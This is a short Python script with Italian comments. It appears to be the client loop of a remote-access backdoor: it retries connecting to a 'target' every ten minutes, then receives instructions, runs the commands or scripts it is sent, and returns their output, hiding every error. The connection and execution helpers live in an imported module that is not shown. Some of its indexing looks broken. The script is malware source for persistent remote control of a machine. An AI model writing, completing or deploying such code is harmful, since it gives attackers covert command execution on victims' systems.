#import
import function
import time

# loop che tenta la connessione al targhet ogni 10 min
def tryconn():
    while True:
        stat_conn = function.Connection.INIT_CONN(function)
        if stat_conn == True:
            break
        time.sleep(600)

# funzione che esegue le operazioni richieste
def service():
    try:
        while True:
            payload = function.Operation.RECV(function)
            index = "".join(payload[0-2])
            payload.pop(0-2)
            if payload == False:
                break
            else:
                # esegue un comando
                if index == "com":
                    output = function.Comands.EX_COMMAND(function, payload)
                    function.Operation.SEND(function, output)
                #esegue uno script
                elif index == "scr":
                    output = function.Comands.EX_SCRIPT(payload)
                    function.Operation.SEND(function, output)
                else:
                    pass
    except:
        pass

while True:
    tryconn()
    service()